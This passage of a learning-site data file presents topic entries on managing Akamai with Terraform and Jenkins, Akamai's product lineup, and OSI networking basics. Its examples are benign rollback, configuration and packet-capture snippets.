# === ROLLBACK (if something breaks) ===
git revert HEAD           # Undo the commit
git push origin main      # Jenkins auto-triggers
# → terraform apply reverts Akamai to previous state
# Total rollback time: ~5 minutes (vs. hours of manual investigation)` },
    ],
    glossary: [
      { title: "IaC & CI/CD Terms", color: "accent", terms: [
        { term: "Terraform", definition: "Infrastructure as Code tool — describe desired state, Terraform makes it happen" },
        { term: "HCL", definition: "HashiCorp Configuration Language — Terraform's declarative syntax" },
        { term: "Provider", definition: "Terraform plugin for interacting with a platform (Akamai, AWS, GCP, etc.)" },
        { term: "State", definition: "Terraform's record of managed resources — maps code to real infrastructure" },
        { term: "Plan", definition: "Preview of changes Terraform will make — review before applying" },
        { term: "Apply", definition: "Execute the planned changes against the target platform" },
        { term: "Drift", definition: "When real infrastructure diverges from what Terraform code describes" },
        { term: "edgerc", definition: "Akamai API credential file with client token, secret, and access token" },
        { term: "Jenkins", definition: "CI/CD automation server for building, testing, and deploying" },
        { term: "Pipeline", definition: "A series of automated stages (init, plan, apply, test, promote)" },
        { term: "State Locking", definition: "Prevents concurrent terraform apply — avoids corruption" },
        { term: "Remote Backend", definition: "Storing Terraform state in S3/Cloud instead of local files" },
      ]},
    ],
    tips: [
      "Always run terraform plan and review before terraform apply — never apply blindly, even in staging",
      "Use remote state with locking (S3 + DynamoDB) to prevent concurrent modifications and state corruption",
      "Import existing Akamai configurations before managing them with Terraform — prevents Terraform from trying to recreate them",
      "Separate staging and production with different Terraform workspaces or variable files, not different code",
      "Store edgerc credentials as Jenkins secrets, never in Git — rotate them regularly",
      "Run terraform plan on a daily cron to detect drift from manual Control Center changes",
    ],
    whenToUse: [
      "You need version-controlled, peer-reviewed Akamai configuration changes",
      "Multiple teams modify Akamai properties and need coordination without stepping on each other",
      "Automated CI/CD deployment of CDN, DNS, and security configurations",
      "Disaster recovery requires reproducible infrastructure from code (not screenshots of Control Center)",
    ],
  },

  "akamai-product-map": {
    id: "akamai-product-map",
    hero: {
      badge1: { label: "Akamai", color: "accent" },
      title: "Akamai Product Map",
      subtitle: "Delivery, Security, Compute Pillars",
      description: "Akamai's product portfolio spans three pillars: Delivery (CDN, media streaming, API acceleration), Security (WAF, DDoS, bot management, Zero Trust), and Compute (cloud computing, edge functions, storage). Understanding the product map helps you choose the right solutions.",
      highlights: [
        { icon: "🚀", label: "Delivery", detail: "Content delivery, media, API acceleration" },
        { icon: "🛡️", label: "Security", detail: "WAF, DDoS, bot, identity, Zero Trust" },
        { icon: "☁️", label: "Compute", detail: "Cloud VMs, edge functions, storage" },
      ],
      mentalModel: "Think of Akamai in three layers: Delivery gets your content to users fast (CDN caching, image optimization, video streaming, API acceleration). Security protects your applications at the edge before attacks reach your infrastructure (WAF rules, DDoS absorption, bot classification, Zero Trust access). Compute provides infrastructure to run your applications (Linode cloud VMs, EdgeWorkers serverless functions, EdgeKV storage). Most customers start with Delivery (Ion CDN), add Security (App & API Protector), then expand to Compute (EdgeWorkers + Linode). The products are designed to work together — an EdgeWorker can read Bot Manager signals, WAF protects CDN-delivered content, and Terraform manages all of it as code.",
    },
    architecture: {
      sectionLabel: "Platform Overview",
      title: "Three Pillars of the Akamai Platform",
      description: "Each pillar addresses different infrastructure needs. All run on Akamai's global edge network of 4,000+ PoPs in 130+ countries.",
      pipeline: [
        { label: "Delivery (CDN)", description: "Ion: full-site CDN with adaptive acceleration, image optimization, prefetching. DSA: dynamic (non-cacheable) content route optimization. Adaptive Media Delivery: video streaming with ABR and DRM. API Gateway: API caching, rate limiting, and transformation.", badge: "CDN", badgeColor: "accent" },
        { label: "Security", description: "App & API Protector: combined WAF + Bot Manager + DDoS. Prolexic: network-layer DDoS scrubbing (3-7 Tbps). Guardicore: micro-segmentation for east-west data center traffic. Enterprise Application Access: Zero Trust network access.", badge: "SEC", badgeColor: "accent" },
        { label: "Compute", description: "Linode: cloud VMs, Kubernetes (LKE), managed databases, block/object storage. EdgeWorkers: serverless JavaScript at the CDN edge. EdgeKV: distributed key-value store. Image & Video Manager: real-time transformation at the edge.", badge: "CMP", badgeColor: "accent" },
      ],
    },
    concepts: [
      { title: "Delivery Products — Getting Content to Users Fast", content: "Ion: Akamai's flagship CDN product. Full-site acceleration — caches static content at the edge, optimizes dynamic content delivery via SureRoute (finds the fastest path through Akamai's network), includes Image & Video Manager for real-time image optimization (resize, format conversion, quality adjustment based on device/connection), prefetching (predicts what the user will request next and fetches it preemptively), and adaptive acceleration (learns your site's resource loading patterns). Dynamic Site Accelerator (DSA): For content that cannot be cached (API responses, personalized pages). Optimizes the route between edge and origin — Akamai's internal network is faster than the public internet. Adaptive Media Delivery: Video-specific CDN. Supports HLS and DASH streaming, adaptive bitrate (ABR), low-latency live streaming, and DRM integration. API Gateway (formerly API Acceleration): Caches API responses at the edge, applies rate limiting, request/response transformation, and provides API analytics." },
      { title: "Security Products — Protecting at the Edge", content: "App & API Protector (AAP): The current unified security product — combines WAF (OWASP Top 10 protection), Bot Manager (1,700+ signatures, behavioral ML), and DDoS mitigation into a single offering. This is what most new customers deploy. Prolexic: Dedicated network-layer DDoS scrubbing. For attacks that exceed CDN-level absorption (rare but happens). Routes all traffic through Akamai scrubbing centers that filter malicious traffic and forward clean traffic to your infrastructure. Capacity: 3-7+ Tbps. Guardicore Segmentation: Protects INTERNAL traffic (east-west) within data centers and cloud environments. Micro-segmentation policies control which servers can talk to which, preventing lateral movement after a breach. Enterprise Application Access (EAA): Zero Trust network access — replaces VPNs. Users authenticate to Akamai's edge, which proxies connections to internal applications. No direct network access to your infrastructure, no VPN client needed." },
      { title: "Compute Products — Running Applications", content: "Linode (Akamai Cloud Computing): Acquired in 2022, Linode provides IaaS: Dedicated and shared VMs (Linodes), Kubernetes Engine (LKE) for container orchestration, managed databases (MySQL, PostgreSQL, MongoDB), block storage (SSD volumes), object storage (S3-compatible), and NodeBalancers (load balancers). Competitive pricing vs. AWS/GCP/Azure with Akamai's global network backbone. EdgeWorkers: Serverless JavaScript at the CDN edge — see the dedicated EdgeWorkers topic. EdgeKV: Distributed key-value store for EdgeWorkers. Image & Video Manager: Real-time image and video transformation at the edge — resize, crop, format conversion (WebP, AVIF), quality optimization based on client device and connection speed." },
      { title: "Product Selection Guide — What to Use When", content: "For a typical web application: start with Ion (CDN) + App & API Protector (WAF + Bot + DDoS). This covers 80% of needs. Add EdgeWorkers for custom edge logic (A/B testing, personalization). For e-commerce: add Bot Manager transactional endpoint protection (login, checkout). For streaming video: Adaptive Media Delivery + Prolexic. For internal/enterprise applications: Enterprise Application Access (Zero Trust) + Guardicore (segmentation). For cloud infrastructure: Linode VMs + LKE (Kubernetes) + Object Storage. For a complete edge-first architecture: Ion + AAP + EdgeWorkers + EdgeKV + Linode (backend). Manage everything with Terraform." },
    ],
    comparisons: [
      {
        title: "Akamai Product Categories",
        description: "Key products in each pillar and their primary use cases.",
        items: [
          { icon: "🚀", label: "Delivery", description: "Getting content to users fast and reliably.", points: ["Ion: full-site acceleration with image optimization", "DSA: dynamic content route optimization", "Adaptive Media Delivery: video streaming (HLS, DASH, ABR)", "API Gateway: API caching, rate limiting, transformation", "Download Delivery: large file distribution (software, games)"] },
          { icon: "🛡️", label: "Security", description: "Protecting applications, APIs, and users.", points: ["App & API Protector: unified WAF + Bot + DDoS", "Prolexic: network-layer DDoS scrubbing (multi-Tbps)", "Guardicore: micro-segmentation for data center traffic", "Enterprise Application Access: Zero Trust (replaces VPN)", "Account Protector: account takeover prevention"] },
          { icon: "☁️", label: "Compute", description: "Infrastructure for running applications.", points: ["Linode: VMs, Kubernetes (LKE), managed databases", "EdgeWorkers: serverless edge functions (JavaScript)", "EdgeKV: distributed key-value store", "Object Storage: S3-compatible storage", "Image & Video Manager: real-time media transformation"] },
        ],
      },
    ],
    codeExamples: [
      { title: "Akamai Property Manager Rule Tree", language: "json", code: `{
  "rules": {
    "name": "default",
    "behaviors": [
      {
        "name": "origin",
        "options": {
          "hostname": "origin.example.com",
          "httpPort": 80,
          "httpsPort": 443,
          "originType": "CUSTOMER"
        }
      },
      { "name": "cpCode", "options": { "value": { "id": 12345 } } },
      { "name": "caching", "options": { "behavior": "MAX_AGE", "ttl": "1d" } }
    ],
    "children": [
      {
        "name": "Static Content",
        "criteria": [
          {
            "name": "fileExtension",
            "options": { "values": ["css", "js", "jpg", "png", "webp", "woff2"] }
          }
        ],
        "behaviors": [
          { "name": "caching", "options": { "behavior": "MAX_AGE", "ttl": "30d" } },
          { "name": "prefetch", "options": { "enabled": true } }
        ]
      },
      {
        "name": "API Endpoints",
        "criteria": [
          { "name": "path", "options": { "values": ["/api/*"] } }
        ],
        "behaviors": [
          { "name": "caching", "options": { "behavior": "NO_STORE" } },
          {
            "name": "sureRoute",
            "options": {
              "enabled": true,
              "testObjectPath": "/api/health"
            }
          }
        ]
      }
    ]
  }
}` },
    ],
    glossary: [
      { title: "Akamai Platform Terms", color: "accent", terms: [
        { term: "Ion", definition: "Full-site CDN product with adaptive acceleration and image optimization" },
        { term: "DSA", definition: "Dynamic Site Accelerator — optimizes non-cacheable content delivery via route optimization" },
        { term: "App & API Protector", definition: "Unified WAF, bot management, and DDoS protection product" },
        { term: "Prolexic", definition: "Network-layer DDoS scrubbing service with multi-Tbps capacity" },
        { term: "Guardicore", definition: "Micro-segmentation for east-west data center traffic" },
        { term: "Linode", definition: "Akamai's cloud computing platform (VMs, Kubernetes, managed databases, storage)" },
        { term: "CP Code", definition: "Content Provider Code — used for billing, reporting, and traffic segmentation" },
        { term: "Property", definition: "An Akamai CDN configuration for a set of hostnames" },
        { term: "SureRoute", definition: "Dynamic route optimization — finds the fastest path through Akamai's network" },
        { term: "PoP", definition: "Point of Presence — a physical Akamai edge server location (4,000+ globally)" },
        { term: "Edge Hostname", definition: "The Akamai CNAME target (e.g., www.example.com.edgekey.net) your domain points to" },
      ]},
    ],
    tips: [
      "Start with Ion (CDN) + App & API Protector — they cover 80% of web application needs",
      "Use CP Codes to separate billing and reporting by site section, team, or project",
      "Akamai's 4,000+ PoPs provide edge computing capability everywhere — leverage EdgeWorkers before building server-side solutions",
      "For cloud infrastructure (VMs, databases), Linode provides competitive pricing with Akamai's network backbone",
    ],
    whenToUse: [
      "You are evaluating which Akamai products to license for your application stack",
      "You need to understand the relationship between delivery, security, and compute offerings",
      "Architecture decisions require choosing between edge-based and origin-based solutions",
      "You are planning a migration from another CDN/cloud provider to Akamai",
    ],
  },

  "akamai-networking": {
    id: "akamai-networking",
    hero: {
      badge1: { label: "OSI", color: "accent" },
      title: "Networking Fundamentals — The OSI Model",
      subtitle: "7 Layers from Application to Physical",
      description: "The OSI (Open Systems Interconnection) model is the universal framework for understanding how data moves across a network. Every technology Akamai provides — CDN, WAF, DDoS protection, TLS, DNS — operates at specific layers of this model. Understanding which layer does what is the key to understanding why different attacks require different defenses.",
      highlights: [
        { icon: "📱", label: "Layer 7: Application", detail: "HTTP, HTTPS — what your browser and apps use" },
        { icon: "🔒", label: "Layer 6: Presentation", detail: "Encryption (TLS), compression, data formatting" },
        { icon: "🔌", label: "Layer 4: Transport", detail: "TCP (reliable) and UDP (fast) — ports and delivery" },
        { icon: "🌐", label: "Layer 3: Network", detail: "IP addresses and routing across the internet" },
      ],
      mentalModel: "Think of the OSI model as a vertical stack. At the top (Layer 7), you have your browser requesting a webpage — human-level stuff. Each layer below handles a different part of getting that request to the server and back. Layer 7 (Application) creates the request. Layer 6 (Presentation) encrypts it. Layer 5 (Session) manages the conversation. Layer 4 (Transport) breaks it into packets and ensures reliable delivery. Layer 3 (Network) routes it across the internet using IP addresses. Layer 2 (Data Link) handles the local hop (your device to your router). Layer 1 (Physical) sends raw electrical signals or light pulses over the wire. When Akamai says 'Layer 3/4 DDoS' vs 'Layer 7 DDoS', they mean attacks at different levels of this stack — and each requires fundamentally different defenses.",
    },
    architecture: {
      sectionLabel: "The 7 Layers",
      title: "The OSI Model — From Top to Bottom",
      description: "Here is the complete model, from what you care about (the app you use) down to the raw hardware. Each layer has a specific job and talks only to the layers directly above and below it.",
      pipeline: [
        { label: "Layer 7: Application", description: "This is your browser, email program, Zoom, etc. It creates the actual message — like 'show me this webpage' or 'send this email.' This is where HTTP/HTTPS lives. Akamai's CDN (Ion), WAF, and Bot Manager all operate here. When you hear 'Layer 7 DDoS attack,' it means valid-looking HTTP requests flooding your application — the hardest kind to defend against because each request looks legitimate.", badge: "L7", badgeColor: "accent" },
        { label: "Layer 6: Presentation", description: "The translator/formatter. Makes sure data looks right for the other computer. Handles encryption (TLS/SSL — making it secret), compression (making it smaller), and format conversion (so both sides understand the data). When your browser shows the padlock icon, that is Layer 6 at work — TLS encrypts your data here before it goes down the stack. Think of it as turning your readable message into a scrambled, compressed package.", badge: "L6", badgeColor: "muted" },
        { label: "Layer 5: Session", description: "The conversation manager. Starts, keeps track of, and ends the 'chat' between applications. Like saying 'hello, let's talk,' checking you are still connected, and 'goodbye' when done. Not super visible in everyday use, but important for long sessions like video calls, database connections, and RPC. TLS handshakes establish sessions at this layer.", badge: "L5", badgeColor: "muted" },
        { label: "Layer 4: Transport", description: "The reliable delivery person. Breaks big messages into smaller pieces (segments), makes sure they arrive in order, and resends anything lost. Two main protocols: TCP (careful and reliable, like registered mail — used for web, email, file transfer) and UDP (fast but no guarantees, like regular post — used for video streaming, gaming, DNS queries). Uses PORTS (like apartment numbers) so multiple apps on one computer don't mix up their data. Port 80 = HTTP, Port 443 = HTTPS, Port 53 = DNS. Akamai's DDoS protection at Layer 3/4 handles SYN floods (TCP) and UDP amplification attacks here.", badge: "L4", badgeColor: "accent" },
        { label: "Layer 3: Network", description: "The router brain. Figures out the path across the entire internet. Uses IP addresses (like house addresses) to route packets from your device to the destination, even across countries. Routers live here. This is where the internet REALLY happens — every packet gets an IP header with source and destination addresses, and routers along the way read these addresses to forward the packet toward its destination. Akamai's Anycast DNS and Prolexic DDoS scrubbing operate at this layer.", badge: "L3", badgeColor: "accent" },
        { label: "Layer 2: Data Link", description: "Local neighborhood delivery. Gets data from one device to the next one RIGHT NEXT to it — same Wi-Fi network or same Ethernet cable. Uses MAC addresses (a device's unique hardware fingerprint, like AA:BB:CC:DD:EE:FF). Switches live here — they are the smart plugs in office networks that know which MAC address is on which port. This layer also checks for errors on the local wire/Wi-Fi and handles frame formatting. You rarely configure this layer directly, but it is why your laptop can talk to your router.", badge: "L2", badgeColor: "muted" },
        { label: "Layer 1: Physical", description: "The actual wires and signals. Just sends raw 0s and 1s — no smarts, pure electricity, light, or radio waves. Ethernet cables (Cat5e, Cat6), fiber optic cables (light pulses), Wi-Fi antennas (radio waves), and the physical connectors/plugs. When your internet goes down because a cable was unplugged or a fiber was cut, that is a Layer 1 problem. Akamai's 4,000+ PoPs are connected by physical fiber optic backbone networks at this layer.", badge: "L1", badgeColor: "muted" },
      ],
    },
    concepts: [
      { title: "Why Layers Matter for Security — Different Attacks, Different Defenses", content: "Layer 3/4 DDoS attacks (SYN floods, UDP amplification, ICMP floods) overwhelm the NETWORK — they do not care about your application at all. They just send so much raw traffic that your connection is saturated. Defense: absorb the traffic with massive capacity (Akamai Prolexic, 3-7+ Tbps) at the network layer. Layer 7 DDoS attacks send valid-looking HTTP requests — each one looks like a real user visiting your site. But there are millions of them, and they all hit expensive endpoints (search, login, checkout). Defense: rate limiting, bot detection, and WAF rules at the application layer (Akamai App & API Protector). You CANNOT defend against Layer 3 attacks with a Layer 7 WAF, and you CANNOT defend against Layer 7 attacks with just bandwidth. You need both." },
      { title: "How Data Actually Travels — Encapsulation", content: "When you send a request, data travels DOWN the stack on your end and UP the stack on the server end. At each layer going down, a header is ADDED (encapsulation): Layer 7 creates the HTTP request → Layer 6 encrypts it (TLS) → Layer 4 adds TCP header (source port, dest port, sequence number) → Layer 3 adds IP header (source IP, dest IP) → Layer 2 adds MAC header (your device MAC, router MAC) → Layer 1 sends raw bits. On the receiving end, each layer strips its header and passes the remaining data UP. This is why a network packet has multiple nested headers — each one is from a different layer, and each one is read by the appropriate device (router reads Layer 3, switch reads Layer 2, your app reads Layer 7)." },
      { title: "Where Akamai Operates in the Stack", content: "Layer 1-2: Akamai's physical infrastructure — 4,000+ PoPs connected via dedicated fiber backbone. You do not configure this. Layer 3: Anycast routing for Edge DNS and Prolexic DDoS scrubbing. BGP announces the same IP from hundreds of locations. Layer 4: TCP optimization (connection pooling between edge and origin), SYN flood protection, and transport-level rate limiting. Layer 6: TLS termination at the edge — the edge server handles encryption/decryption so your origin does not have to. Layer 7: Everything you interact with — CDN caching (Ion), WAF rules (App & API Protector), Bot Manager, EdgeWorkers, and Property Manager behaviors. Most Akamai configuration happens at Layer 7." },
      { title: "TCP vs UDP — The Two Transport Protocols", content: "TCP (Transmission Control Protocol): Connection-oriented, reliable. Before sending data, TCP does a 3-way handshake (SYN → SYN-ACK → ACK) to establish a connection. It guarantees delivery (retransmits lost packets), preserves order, and provides flow control. Used for: HTTP/HTTPS (web), SMTP (email), FTP (files), SSH. The downside: reliability adds latency — the handshake alone costs 1 RTT. UDP (User Datagram Protocol): Connectionless, unreliable (on purpose). No handshake, no delivery guarantee, no ordering. Just 'fire and forget.' Used for: DNS queries (small, one-shot), video streaming (a dropped frame is better than a delayed one), online gaming, VoIP. Faster because there is no setup overhead. DNS uses UDP for queries (fast) but falls back to TCP for large responses (zone transfers, DNSSEC)." },
      { title: "Ports — How One Computer Runs Many Services", content: "A single server has one IP address but runs many services (web server, email, database, SSH). Ports (Layer 4) are like apartment numbers in a building — they direct traffic to the right service. Well-known ports: 80 (HTTP), 443 (HTTPS), 53 (DNS), 22 (SSH), 25 (SMTP), 3306 (MySQL). When your browser connects to www.example.com:443, it is connecting to IP address X on PORT 443. Your browser also uses a random 'ephemeral' port on your side (e.g., 52391) so the server knows where to send the response back. This is why firewalls often block by port — closing port 22 disables SSH access, closing port 3306 prevents remote database connections." },
    ],
    comparisons: [
      {
        title: "Layer 3/4 vs Layer 7 — Two Different Worlds",
        description: "These layers handle fundamentally different things. Attacks at each layer require different defenses.",
        items: [
          { icon: "🌐", label: "Layer 3/4 (Network/Transport)", description: "Raw packets and connections — no application awareness.", points: ["Deals with IP addresses, ports, and raw packet delivery", "Attacks: SYN floods, UDP amplification, ICMP floods, DNS reflection", "Defense: massive bandwidth capacity to absorb floods (Prolexic)", "No visibility into HTTP content — just sees packets and bytes", "Analogy: flooding someone's mailbox with millions of empty envelopes"] },
          { icon: "📱", label: "Layer 7 (Application)", description: "HTTP requests — understands the application.", points: ["Deals with URLs, headers, cookies, request bodies, API calls", "Attacks: HTTP floods, slowloris, credential stuffing, scraping", "Defense: WAF rules, rate limiting, bot detection, behavioral analysis", "Can inspect content and make smart decisions about each request", "Analogy: millions of people walking into a store and asking complicated questions"] },
        ],
      },
    ],
    codeExamples: [
      { title: "See the Layers in Action — tcpdump and Wireshark", language: "bash", code: `# Capture packets and see the layer headers in real-time
# tcpdump shows you Layer 3 (IP) and Layer 4 (TCP/UDP) headers

# Capture DNS queries (Layer 7 over UDP Layer 4)
$ sudo tcpdump -n port 53
14:30:01 IP 192.168.1.100.52391 > 8.8.8.8.53: 
  12345+ A? www.example.com. (33)
# ↑ Your IP:ephemeral_port → Google DNS:port 53
# ↑ Asking for A record for www.example.com

# Capture HTTPS connections (see the TCP handshake)
$ sudo tcpdump -n port 443 -c 10
14:30:02 IP 192.168.1.100.52392 > 93.184.216.34.443: 
  Flags [S], seq 123456       # SYN (Step 1 of TCP handshake)
14:30:02 IP 93.184.216.34.443 > 192.168.1.100.52392: 
  Flags [S.], seq 789012      # SYN-ACK (Step 2)
14:30:02 IP 192.168.1.100.52392 > 93.184.216.34.443: 
  Flags [.], ack 789013       # ACK (Step 3 — TCP connected!)
# After this: TLS handshake (Layer 6), then HTTP (Layer 7)

# Check which ports are open on your server (Layer 4)
$ netstat -tlnp
Active Internet connections (only servers)
Proto  Local Address      State    PID/Program
tcp    0.0.0.0:80         LISTEN   nginx
tcp    0.0.0.0:443        LISTEN   nginx
tcp    0.0.0.0:22         LISTEN   sshd
tcp    0.0.0.0:3306       LISTEN   mysqld` },
    ],
    glossary: [
      { title: "Networking Terms", color: "accent", terms: [
        { term: "OSI Model", definition: "7-layer reference model for understanding network communication" },
        { term: "TCP", definition: "Transmission Control Protocol — reliable, ordered delivery with handshake (Layer 4)" },
        { term: "UDP", definition: "User Datagram Protocol — fast, connectionless, no delivery guarantee (Layer 4)" },
        { term: "IP Address", definition: "Layer 3 address identifying a device on the network (IPv4: 192.168.1.1, IPv6: 2001:db8::1)" },
        { term: "MAC Address", definition: "Layer 2 hardware address unique to each network interface (AA:BB:CC:DD:EE:FF)" },
        { term: "Port", definition: "Layer 4 number directing traffic to a specific service (80=HTTP, 443=HTTPS, 53=DNS)" },
        { term: "SYN Flood", definition: "Layer 4 DDoS attack — sending millions of TCP SYN packets to exhaust server connections" },
        { term: "Encapsulation", definition: "Each layer wrapping data with its own header as it travels down the stack" },
        { term: "RTT", definition: "Round-Trip Time — time for a packet to travel to destination and back" },
        { term: "Anycast", definition: "Same IP announced from multiple locations — traffic routes to nearest (Layer 3)" },
        { term: "BGP", definition: "Border Gateway Protocol — how routers share routing information across the internet" },
      ]},
    ],
    tips: [
      "When debugging network issues, identify the layer first: Can't reach the server at all? Layer 3 (routing/IP). Connection resets? Layer 4 (TCP). 403 Forbidden? Layer 7 (WAF/app).",
      "Layer 3/4 DDoS requires bandwidth to absorb. Layer 7 DDoS requires intelligence to detect. You need both.",
      "TLS operates at Layer 6 — it encrypts everything above it (Layer 7 HTTP data) but the layers below (IP addresses, ports) are still visible to the network",
      "Most Akamai products you configure operate at Layer 7. DDoS protection and Prolexic operate at Layer 3/4. Understanding this helps you pick the right product.",
    ],
    whenToUse: [
      "You need to understand why different attacks require different defenses (Layer 3/4 vs Layer 7)",
      "Debugging network issues — identifying which layer the problem is at saves hours",
      "Understanding where TLS, DNS, CDN, and WAF fit in the networking stack",
      "Communicating with network engineers — the OSI model is the shared vocabulary",
    ],
  },
};
